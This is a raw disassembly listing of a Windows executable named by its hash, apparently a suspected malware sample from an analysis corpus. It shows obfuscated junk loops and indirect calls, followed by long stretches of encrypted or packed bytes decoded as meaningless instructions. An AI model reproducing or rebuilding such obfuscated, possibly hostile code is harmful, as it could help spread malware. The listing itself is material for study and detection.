
fd0244d152615437e1c6d9d929aaa6fcbad68a70f0816704204d8c3adf346dc9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fe0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fe09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e21c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fdf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fdd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fdd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fdd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fdd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fdd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e627
  401090:	cmp    DWORD PTR ds:0x42fdd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fdd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fdd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e224,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e80b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e7fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e7fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e7fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e228
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e3cf
  401100:	cmp    DWORD PTR ds:0x42e7fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e7fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e7fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e7fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e7fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e21c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e21c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e21c,esi
  401145:	cmp    DWORD PTR ds:0x42e21c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e62b
  401160:	cmp    DWORD PTR ds:0x42e21c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e21c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e21c,esi
  40117c:	cmp    DWORD PTR ds:0x42e21c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e234,0x1a
  401193:	cmp    DWORD PTR ds:0x42e234,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e234,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fe7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e327
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e54b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e234
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e234,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e7fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fe05
  4011f8:	adc    esi,DWORD PTR ds:0x42fe09
  4011fe:	mov    DWORD PTR ds:0x42fe05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e803,0x17
  401216:	cmp    DWORD PTR ds:0x42e803,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e803,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e2c6
  401238:	push   0x42e27d
  40123d:	call   DWORD PTR ds:0x42e62f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e803
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e803,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fe7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fe7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fe7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e327
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e633
  4012a0:	mov    esi,DWORD PTR ds:0x42fe7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fe7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	aad    0xbf
  4012f5:	loope  0x40131b
  4012f7:	jo     0x401369
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    edx,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	cmp    al,0x2
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	outs   dx,BYTE PTR ds:[esi]
  4013a8:	test   ch,bh
  4013aa:	mov    eax,ds:0xb0235b0e
  4013af:	js     0x401379
  4013b1:	mov    dl,0x27
  4013b3:	jge    0x4013ea
  4013b5:	sti    
  4013b6:	(bad)  
  4013b7:	xlat   BYTE PTR ds:[ebx]
  4013b8:	das    
  4013b9:	hlt    
  4013ba:	push   0xffffffea
  4013bc:	gs inc ebp
  4013be:	cs sbb al,0x1b
  4013c1:	mov    ebx,0x426038c4
  4013c6:	gs push DWORD PTR gs:0x134bbd1
  4013ce:	and    esi,DWORD PTR [ebp-0x24a44080]
  4013d4:	adc    BYTE PTR [ecx-0x597106a],ch
  4013da:	mov    esi,DWORD PTR [edx-0x70af05b3]
  4013e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013e1:	jb     0x40141f
  4013e3:	push   ss
  4013e4:	add    eax,0x59fa688e
  4013e9:	push   eax
  4013ea:	inc    ecx
  4013eb:	add    ah,bh
  4013ed:	in     al,0xbd
  4013ef:	xor    al,0xed
  4013f1:	lods   eax,DWORD PTR ds:[esi]
  4013f2:	es sbb esi,ecx
  4013f5:	add    eax,0xacbdcc07
  4013fa:	pop    edi
  4013fb:	mov    cl,0x71
  4013fd:	xchg   esp,eax
  4013fe:	in     ax,0xc9
  401401:	aas    
  401402:	adc    ebp,DWORD PTR [edx]
  401404:	pop    edi
  401405:	push   esi
  401406:	cmp    al,0x2f
  401408:	sub    BYTE PTR [edi],ch
  40140a:	xchg   edi,eax
  40140b:	mov    dl,0x1f
  40140d:	xchg   esi,ebx
  40140f:	hlt    
  401410:	aas    
  401411:	pop    ss
  401412:	xlat   BYTE PTR ds:[ebx]
  401413:	or     dl,bl
  401415:	imul   ecx,DWORD PTR [edx-0x4d],0xa7ac0cb4
  40141c:	inc    ecx
  40141d:	dec    ecx
  40141e:	les    ebx,FWORD PTR [ebx+0x36]
  401421:	mov    dh,BYTE PTR [eax]
  401423:	out    dx,eax
  401424:	inc    esp
  401425:	(bad)  
  401426:	push   si
  401428:	xchg   edx,eax
  401429:	stc    
  40142a:	lea    esi,[esi-0x95fab]
  401430:	cmp    eax,0x167b6ad4
  401435:	jns    0x401489
  401437:	mov    edi,fs
  401439:	pop    esi
  40143a:	mov    ah,BYTE PTR [ecx+0x127aa53c]
  401440:	data16 and al,0xfa
  401443:	inc    ebp
  401444:	out    dx,al
  401445:	mov    bl,0x9f
  401447:	nop
  401448:	dec    ecx
  401449:	out    0x56,eax
  40144b:	cmp    al,0x62
  40144d:	sbb    bl,dl
  40144f:	outs   dx,DWORD PTR ds:[esi]
  401450:	shr    BYTE PTR [edi],0x92
  401453:	pop    DWORD PTR [eax+0x7eef8551]
  401459:	push   edx
  40145a:	push   ebx
  40145b:	mov    fs,esp
  40145d:	test   BYTE PTR [esi+0x4c],al
  401460:	dec    ebx
  401462:	pop    ebx
  401463:	cdq    
  401464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401465:	sub    eax,0x709259d6
  40146a:	(bad)  
  40146c:	xchg   ecx,eax
  40146d:	leave  
  40146e:	push   ebp
  40146f:	pop    ecx
  401470:	pop    ebp
  401471:	push   ss
  401472:	das    
  401473:	sbb    al,dl
  401475:	lock enter 0xbb7b,0x9f
  40147a:	and    dl,BYTE PTR [edx+0x69]
  40147d:	(bad)  
  40147f:	imul   ebx,DWORD PTR [esp+ebx*8+0x1db724ed],0xffffffe9
  401487:	dec    edi
  401488:	int    0x99
  40148a:	aas    
  40148b:	in     al,dx
  40148c:	add    ch,cl
  40148e:	pop    edi
  40148f:	pop    ss
  401490:	pop    eax
  401491:	or     BYTE PTR [eax+0x4d695194],bh
  401497:	ss and eax,0x7e00d4e7
  40149d:	loope  0x4014d2
  40149f:	push   ss
  4014a0:	test   al,0x93
  4014a2:	push   esp
  4014a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014a4:	dec    ebx
  4014a5:	adc    edi,0x28ca6e0b
  4014ab:	jmp    0x99b711e6
  4014b0:	aad    0x26
  4014b2:	push   ecx
  4014b3:	inc    esp
  4014b4:	push   ebx
  4014b5:	sbb    esp,DWORD PTR [ebx]
  4014b7:	hlt    
  4014b8:	enter  0xa0f9,0xa
  4014bc:	sbb    DWORD PTR [eax+0x31],edi
  4014bf:	sbb    eax,0x2578eb13
  4014c4:	leave  
  4014c5:	mov    ?,WORD PTR [esi]
  4014c7:	pop    edi
  4014c8:	adc    bl,0x39
  4014cb:	pop    edi
  4014cc:	shl    ebp,cl
  4014ce:	xchg   esp,eax
  4014cf:	add    eax,0x3dfd4257
  4014d4:	bound  ebx,QWORD PTR [edx+0x77bddbed]
  4014da:	sub    BYTE PTR [ecx+0x4c1a63ea],0xcc
  4014e1:	or     BYTE PTR [ecx+0x17bb7de5],bh
  4014e7:	cmp    al,bl
  4014e9:	add    esi,DWORD PTR [ebx]
  4014eb:	pop    esi
  4014ec:	or     BYTE PTR [esi],ah
  4014ee:	mov    edi,0xe546d0d3
  4014f3:	pop    edx
  4014f4:	pop    edi
  4014f5:	sti    
  4014f6:	or     esi,edx
  4014f8:	cli    
  4014f9:	inc    ebx
  4014fa:	sbb    ch,BYTE PTR [eax-0x50]
  4014fd:	xor    al,0x8c
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x6e4be013]
  401516:	inc    ebp
  401517:	ja     0x401589
  401519:	jle    0x40158b
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x401547
  401521:	fwait
  401522:	(bad)  
  401523:	push   0x6d
  401525:	push   cs
  401526:	xchg   ebx,eax
  401527:	jl     0x40151a
  401529:	out    dx,eax
  40152a:	(bad)  
  40152b:	fsub   DWORD PTR [edi-0x15]
  40152e:	pop    ss
  40152f:	sbb    eax,0x40d5bf17
  401534:	fs pushf 
  401536:	sar    bl,cl
  401538:	inc    esi
  401539:	cmp    BYTE PTR [ecx+0x14d11d6a],ah
  40153f:	imul   edi,DWORD PTR [edi+ecx*2-0x76],0x703e6c22
  401547:	pop    es
  401548:	data16 jnp 0x40153c
  40154b:	and    esp,ebp
  40154d:	xor    al,0xc1
  40154f:	cmc    
  401550:	and    eax,0xbfbd107c
  401555:	div    DWORD PTR ds:[ebx+eiz*4]
  401559:	fnstenv [edi-0x79]
  40155c:	pop    ebp
  40155d:	xchg   BYTE PTR [eax-0x1f],ch
  401560:	push   esp
  401561:	orps   xmm2,xmm0
  401564:	into   
  401565:	xlat   BYTE PTR ds:[ebx]
  401566:	test   BYTE PTR [esi+0x6b3c1599],bl
  40156c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40156e:	cmp    al,0xb8
  401570:	jo     0x40150e
  401572:	add    ecx,ebp
  401574:	rcr    BYTE PTR [ecx+0x55],1
  401577:	js     0x4015a9
  401579:	adc    dl,bh
  40157b:	or     eax,0x4306bc34
  401580:	out    0xd0,al
  401582:	or     BYTE PTR [eax-0x2294662c],0xd6
  401589:	leave  
  40158a:	dec    edi
  40158b:	pop    esi
  40158c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40158d:	(bad)  
  40158e:	pop    edx
  40158f:	int3   
  401590:	xor    BYTE PTR [esi],bh
  401592:	icebp  
  401593:	pop    es
  401594:	out    0xb6,eax
  401596:	repnz sbb eax,0xd1f7ada1
  40159c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40159e:	adc    ebx,0xfffffff2
  4015a1:	jne    0x40154e
  4015a3:	fstp   DWORD PTR [edx]
  4015a5:	and    esp,esi
  4015a7:	adc    edi,DWORD PTR [ebp-0x48]
  4015aa:	rcl    esp,0xc0
  4015ad:	add    ebx,eax
  4015af:	adc    eax,DWORD PTR [ebx-0x4d]
  4015b2:	scas   eax,DWORD PTR es:[edi]
  4015b3:	in     eax,dx
  4015b4:	call   DWORD PTR [edx-0x7a]
  4015b7:	jl     0x4015e4
  4015b9:	push   ebx
  4015ba:	cmp    al,0xa4
  4015bc:	pop    esp
  4015bd:	into   
  4015be:	(bad)  
  4015bf:	sar    BYTE PTR [edi+0x5e],0x2
  4015c3:	in     eax,dx
  4015c4:	jne    0x401624
  4015c6:	arpl   WORD PTR [ecx+0xc],bp
  4015c9:	int3   
  4015ca:	ror    dh,1
  4015cc:	in     eax,0x9c
  4015ce:	fimul  DWORD PTR [edx]
  4015d0:	and    BYTE PTR [edi-0x3c77c72d],0x4b
  4015d7:	popa   
  4015d8:	les    eax,FWORD PTR [ecx]
  4015da:	out    dx,al
  4015db:	push   esp
  4015dc:	clc    
  4015dd:	pop    ebp
  4015de:	je     0x401581
  4015e0:	or     al,0x46
  4015e2:	and    eax,DWORD PTR [eax+0x49]
  4015e5:	in     al,dx
  4015e6:	mov    al,ah
  4015e8:	js     0x401617
  4015ea:	jmp    0x9db3:0xe5abdbe4
  4015f1:	sbb    BYTE PTR ds:0x310ffd40,dh
  4015f7:	xchg   ebp,edx
  4015f9:	(bad)
  4015fd:	shr    BYTE PTR [ecx],1
  4015ff:	outs   dx,DWORD PTR ds:[esi]
  401600:	and    dl,BYTE PTR [ecx+0x70bfd9aa]
  401606:	(bad)  
  401607:	mov    esi,0xdeba9e8a
  40160c:	pop    esi
  40160d:	add    al,0xc6
  40160f:	or     esi,ebx
  401611:	xor    al,0x8f
  401613:	shl    BYTE PTR [edx-0x13],cl
  401616:	xchg   esp,eax
  401617:	fst    QWORD PTR [eax+0x5e]
  40161a:	dec    ebp
  40161b:	dec    ebp
  40161c:	push   edi
  40161d:	mov    dl,0xc1
  40161f:	push   ecx
  401620:	add    ecx,DWORD PTR [edx]
  401622:	adc    BYTE PTR [esi+edi*1+0x60],0x1b
  401627:	add    al,0xf0
  401629:	ins    BYTE PTR es:[edi],dx
  40162a:	or     cl,BYTE PTR [edx-0x6502bb1d]
  401630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401631:	je     0x401611
  401633:	adc    al,0x14
  401635:	dec    ecx
  401636:	scas   al,BYTE PTR es:[edi]
  401637:	out    dx,al
  401638:	xor    al,0xf8
  40163a:	shr    BYTE PTR [edi+0x6],0x57
  40163e:	mov    ebp,0x6c23cd5
  401643:	mov    cl,0xc3
  401645:	nop
  401646:	loop   0x4015cd
  401648:	adc    ch,BYTE PTR [ebp+0x35a258eb]
  40164e:	push   ss
  40164f:	mov    al,ds:0x2d6dd426
  401654:	shufps xmm7,XMMWORD PTR [bp+di],0xd4
  401659:	mov    ss,ecx
  40165b:	push   ss
  40165c:	fwait
  40165d:	inc    ebx
  40165e:	lods   al,BYTE PTR ds:[esi]
  40165f:	sub    BYTE PTR [edi+0x4010337b],ah
  401665:	mov    WORD PTR [ecx+0x47df344f],cs
  40166b:	or     cl,cl
  40166d:	(bad)  
  40166e:	ror    BYTE PTR [edi-0x77],cl
  401671:	jno    0x401655
  401673:	pop    ebp
  401674:	or     ecx,ebp
  401676:	cmp    al,0x32
  401678:	call   0x320f:0xb79c5898
  40167f:	push   ebp
  401680:	jp     0x4016f6
  401682:	loope  0x40161d
  401684:	mov    BYTE PTR [ebp-0x39d1211d],dl
  40168a:	xor    al,0x15
  40168c:	inc    edx
  40168d:	mov    eax,ds:0x6a740f0d
  401692:	std    
  401693:	les    edx,FWORD PTR [eax]
  401695:	pop    eax
  401696:	clc    
  401697:	shl    DWORD PTR [edi],0x2
  40169a:	clc    
  40169b:	repnz (bad) 
  40169d:	xor    dl,al
  40169f:	div    BYTE PTR [esi-0x5b]
  4016a2:	gs mov fs,edi
  4016a5:	sub    eax,0xbef4f2bc
  4016aa:	push   ebp
  4016ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ac:	retf   0xcfbb
  4016af:	inc    ebx
  4016b0:	fdivrp st(4),st
  4016b2:	test   DWORD PTR [ebx+0x72],edx
  4016b5:	add    BYTE PTR [ebp+ebx*1-0x23fa8d8e],al
  4016bc:	mov    edi,DWORD PTR [edx+0xa]
  4016bf:	sbb    dl,BYTE PTR [edx]
  4016c1:	ss pushf 
  4016c3:	js     0x401722
  4016c5:	xor    ecx,DWORD PTR [edi-0x67]
  4016c8:	test   ecx,edx
  4016ca:	or     BYTE PTR [eax-0x2c95e3d3],ah
  4016d0:	mov    cl,0x76
  4016d2:	cmp    DWORD PTR [esi],ebx
  4016d4:	cmp    al,BYTE PTR [edx]
  4016d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016d7:	xor    eax,0xffffffdb
  4016da:	shr    BYTE PTR [esi+0x232d8557],1
  4016e0:	sub    BYTE PTR [eax-0x11],al
  4016e3:	loopne 0x4016dd
  4016e5:	fsubr  st(1),st
  4016e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e8:	lods   al,BYTE PTR ds:[esi]
  4016e9:	enter  0x9fb4,0xe8
  4016ed:	cwde   
  4016ee:	adc    DWORD PTR [ebx-0x27],edi
  4016f1:	fs (bad) 
  4016f3:	jne    0x401723
  4016f5:	jo     0x4016d2
  4016f7:	aam    0x64
  4016f9:	(bad)  
  4016fa:	sti    
  4016fb:	xchg   ebp,eax
  4016fc:	mov    cl,0xd4
  4016fe:	cld    
  4016ff:	pop    esp
  401700:	xchg   esi,eax
  401701:	cmp    DWORD PTR [edi-0x51],0x38
  401705:	mov    ds:0xf5caec13,eax
  40170a:	jns    0x40171b
  40170c:	repnz add DWORD PTR [esi],ecx
  40170f:	data16 test al,0xa8
  401712:	xchg   ecx,eax
  401713:	retf   
  401714:	adc    eax,0xa8ebacca
  401719:	icebp  
  40171a:	adc    esp,DWORD PTR [ecx+0x415d106a]
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	sahf   
  401741:	add    DWORD PTR es:[ebx+0x70707c70],ebx
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	popa   
  40174d:	adc    BYTE PTR ds:0xf601a587,al
  401753:	stos   BYTE PTR es:[edi],al
  401754:	mov    ebx,DWORD PTR [esi+0x3]
  401757:	add    eax,DWORD PTR [edi+esi*8+0x52]
  40175b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40175c:	scas   al,BYTE PTR es:[edi]
  40175d:	out    0x25,eax
  40175f:	pop    es
  401760:	aaa    
  401761:	jne    0x4016e8
  401763:	std    
  401764:	fbstp  TBYTE PTR [edi+0x25]
  401767:	add    esp,DWORD PTR [eax]
  401769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40176a:	cmp    DWORD PTR [esp+edx*1+0x61],0x1c0a6fa0
  401772:	push   edx
  401773:	cwde   
  401774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401775:	push   ebp
  401776:	mov    eax,0x29b55bff
  40177b:	loope  0x4017f0
  40177d:	mul    BYTE PTR [ecx]
  40177f:	xchg   esp,eax
  401780:	iret   
  401781:	mov    bl,0xff
  401783:	les    ebx,FWORD PTR [esi+0x1f3ffc71]
  401789:	adc    edx,DWORD PTR [eax-0x3c]
  40178c:	gs out dx,eax
  40178e:	xchg   edx,eax
  40178f:	and    al,0x56
  401791:	ret    
  401792:	(bad)  
  401793:	mov    edx,0xd385ef6b
  401798:	push   ds
  401799:	cmp    eax,0x94fa2c79
  40179e:	mov    dl,0xa4
  4017a0:	xchg   ebx,edi
  4017a2:	lds    ebp,FWORD PTR [ebx]
  4017a4:	xchg   ecx,eax
  4017a5:	lahf   
  4017a6:	xchg   ebp,eax
  4017a7:	ret    
  4017a8:	pop    esp
  4017a9:	call   DWORD PTR [edi-0x75]
  4017ac:	cmp    DWORD PTR [edi+0x7f],edi
  4017af:	push   0xf6ad7d19
  4017b4:	stos   BYTE PTR es:[edi],al
  4017b5:	push   ss
  4017b6:	mov    eax,ds:0xbdda9e6c
  4017bb:	sar    edx,1
  4017bd:	(bad)  
  4017be:	fistp  DWORD PTR [edi-0xac0a4e]
  4017c4:	xchg   DWORD PTR [edx],edx
  4017c6:	mov    dl,0xbc
  4017c8:	mov    al,ds:0x60ca410d
  4017cd:	jbe    0x401786
  4017cf:	outs   dx,DWORD PTR ds:[esi]
  4017d0:	jns    0x40182a
  4017d2:	and    DWORD PTR [ebp-0x53],0xdaed82a9
  4017d9:	ss shl dl,cl
  4017dc:	loop   0x401818
  4017de:	mul    BYTE PTR [eax-0x39fc9c7a]
  4017e4:	xor    DWORD PTR ds:0x2baca45e,edx
  4017ea:	push   0xc68f5a81
  4017ef:	dec    edx
  4017f0:	aad    0x78
  4017f2:	ins    BYTE PTR es:[edi],dx
  4017f3:	in     al,0xa7
  4017f5:	adc    DWORD PTR [edi-0x143dfd64],esi
  4017fb:	push   0x1a6cf8bf
  401800:	lock mov ds:0xc5a27d39,al
  401806:	and    al,0x8f
  401808:	fnstcw WORD PTR [edi]
  40180a:	sub    al,0x8a
  40180c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40180d:	xor    al,0xf4
  40180f:	add    eax,0x8cfe1740
  401814:	sub    al,0xa2
  401816:	dec    ebx
  401817:	sub    DWORD PTR [ebx-0x20b54137],ebx
  40181d:	cmp    ebx,DWORD PTR [edi+0x694c94c9]
  401823:	rol    ebx,0xd1
  401826:	xchg   ebx,eax
  401827:	fist   WORD PTR es:[edx+ecx*2-0x37]
  40182c:	mov    ebx,0x45127660
  401831:	mov    eax,0x174b3716
  401836:	adc    BYTE PTR [edx-0x80],dh
  401839:	jns    0x401838
  40183b:	pop    ecx
  40183c:	xchg   esp,eax
  40183d:	dec    edi
  40183e:	jns    0x40182d
  401840:	mov    edx,0x73abf1a4
  401845:	repnz xor eax,eax
  401848:	icebp  
  401849:	in     eax,dx
  40184a:	cmc    
  40184b:	mov    fs,WORD PTR [ecx]
  40184d:	xchg   ecx,eax
  40184e:	add    BYTE PTR [edi],cl
  401850:	bnd js 0x401881
  401853:	mov    ds:0xae43093a,eax
  401858:	xor    al,0xcd
  40185a:	pushf  
  40185b:	mov    cx,0xa2fd
  40185f:	mov    ecx,0x7f836b00
  401864:	add    al,0x2b
  401866:	fimul  WORD PTR ds:0x63bfdc8d
  40186c:	or     eax,0xc1f96068
  401871:	ins    BYTE PTR es:[edi],dx
  401872:	mov    ?,WORD PTR [edx-0x24]
  401875:	icebp  
  401876:	pusha  
  401877:	cld    
  401878:	ins    DWORD PTR es:[edi],dx
  401879:	cmp    BYTE PTR [esi],dl
  40187b:	xchg   ebx,eax
  40187c:	ficomp WORD PTR [eax-0x72]
  40187f:	out    0x4,al
  401881:	cs inc esi
  401883:	xchg   edx,eax
  401884:	les    edx,FWORD PTR [edx-0x49]
  401887:	popf   
  401888:	cli    
  401889:	pop    ebp
  40188a:	push   ss
  40188b:	stc    
  40188c:	xchg   esi,eax
  40188d:	popa   
  40188e:	ja     0x401849
  401890:	jb     0x4018d5
  401892:	mov    edi,0x2291592b
  401897:	shl    BYTE PTR [ebp+esi*1-0x65],0xdc
  40189c:	ret    0xa416
  40189f:	inc    edi
  4018a0:	or     ah,BYTE PTR [esi]
  4018a2:	push   0xf79df746
  4018a7:	mov    dh,0x89
  4018a9:	add    dh,dl
  4018ab:	push   ecx
  4018ac:	daa    
  4018ad:	cmp    dh,al
  4018af:	les    ecx,FWORD PTR [ecx-0x9]
  4018b2:	xchg   ebp,eax
  4018b3:	jmp    0xd48a:0xfbf2b805
  4018ba:	les    edi,FWORD PTR [esi-0x64]
  4018bd:	test   DWORD PTR [ebx+0x28e45cc1],esp
  4018c3:	imul   ebx,DWORD PTR [ecx-0x49],0xd4af72b7
  4018ca:	sbb    dl,BYTE PTR [ecx+0x3e]
  4018cd:	mov    ch,0xe
  4018cf:	xchg   edi,eax
